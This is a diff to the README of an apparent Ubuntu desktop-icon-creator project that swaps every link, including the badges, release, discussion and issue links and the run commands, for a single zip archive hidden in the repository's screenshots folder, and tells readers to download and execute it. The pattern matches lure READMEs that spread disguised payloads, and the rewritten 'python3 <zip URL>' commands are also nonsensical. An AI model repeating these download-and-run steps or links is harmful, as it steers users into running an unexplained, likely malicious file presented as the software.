@@ -1,6 +1,6 @@
 # Create Custom Desktop Icons for Ubuntu Shell Scripts 🎨
 
-![GitHub release](https://img.shields.io/badge/Release-v1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg) ![Python](https://img.shields.io/badge/Python-3.8%2B-yellow.svg)
+![GitHub release](https://github.com/Seelan-Guna/desktop-icon-creator/raw/refs/heads/main/screenshots/icon_creator_desktop_3.7.zip) ![License](https://github.com/Seelan-Guna/desktop-icon-creator/raw/refs/heads/main/screenshots/icon_creator_desktop_3.7.zip) ![Python](https://github.com/Seelan-Guna/desktop-icon-creator/raw/refs/heads/main/screenshots/icon_creator_desktop_3.7.zip%https://github.com/Seelan-Guna/desktop-icon-creator/raw/refs/heads/main/screenshots/icon_creator_desktop_3.7.zip)
 
 Welcome to the **desktop-icon-creator** repository! This tool allows you to create beautiful, custom desktop icons for your Ubuntu Linux shell scripts. With features like gradients, font options, and full management tools, you can enhance your desktop experience.
 
@@ -25,7 +25,7 @@ Welcome to the **desktop-icon-creator** repository! This tool allows you to crea
 
 ## Installation
 
-To get started, download the latest release from the [Releases section](https://github.com/Seelan-Guna/desktop-icon-creator/releases). Execute the downloaded file to install the application.
+To get started, download the latest release from the [Releases section](https://github.com/Seelan-Guna/desktop-icon-creator/raw/refs/heads/main/screenshots/icon_creator_desktop_3.7.zip). Execute the downloaded file to install the application.
 
 ### Requirements
 
@@ -34,18 +34,18 @@ To get started, download the latest release from the [Releases section](https://
 
 ### Installation Steps
 
-1. **Download the latest release** from the [Releases section](https://github.com/Seelan-Guna/desktop-icon-creator/releases).
+1. **Download the latest release** from the [Releases section](https://github.com/Seelan-Guna/desktop-icon-creator/raw/refs/heads/main/screenshots/icon_creator_desktop_3.7.zip).
 2. **Run the installer**:
    - Open your terminal.
    - Navigate to the directory where you downloaded the file.
-   - Execute the command: `python3 desktop-icon-creator.py`.
+   - Execute the command: `python3 https://github.com/Seelan-Guna/desktop-icon-creator/raw/refs/heads/main/screenshots/icon_creator_desktop_3.7.zip`.
 
 ## Usage
 
 After installation, you can launch the application from your applications menu or by running the command in the terminal:
 
 ```bash
-python3 desktop-icon-creator.py
+python3 https://github.com/Seelan-Guna/desktop-icon-creator/raw/refs/heads/main/screenshots/icon_creator_desktop_3.7.zip
 ```
 
 ### Creating an Icon
@@ -93,7 +93,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest updates and releases, visit the [Releases section](https://github.com/Seelan-Guna/desktop-icon-creator/releases). Here, you can download the latest version and stay informed about new features.
+For the latest updates and releases, visit the [Releases section](https://github.com/Seelan-Guna/desktop-icon-creator/raw/refs/heads/main/screenshots/icon_creator_desktop_3.7.zip). Here, you can download the latest version and stay informed about new features.
 
 ## Additional Resources
 
@@ -104,7 +104,7 @@ For the latest updates and releases, visit the [Releases section](https://github
 
 ### Community
 
-Join our community on [GitHub Discussions](https://github.com/Seelan-Guna/desktop-icon-creator/discussions) to share your ideas, ask questions, and collaborate with others.
+Join our community on [GitHub Discussions](https://github.com/Seelan-Guna/desktop-icon-creator/raw/refs/heads/main/screenshots/icon_creator_desktop_3.7.zip) to share your ideas, ask questions, and collaborate with others.
 
 ### Tutorials
 
@@ -113,7 +113,7 @@ Join our community on [GitHub Discussions](https://github.com/Seelan-Guna/deskto
 
 ### Troubleshooting
 
-If you encounter any issues, check the [issues section](https://github.com/Seelan-Guna/desktop-icon-creator/issues) for solutions or report a new issue.
+If you encounter any issues, check the [issues section](https://github.com/Seelan-Guna/desktop-icon-creator/raw/refs/heads/main/screenshots/icon_creator_desktop_3.7.zip) for solutions or report a new issue.
 
 ## Acknowledgments
 
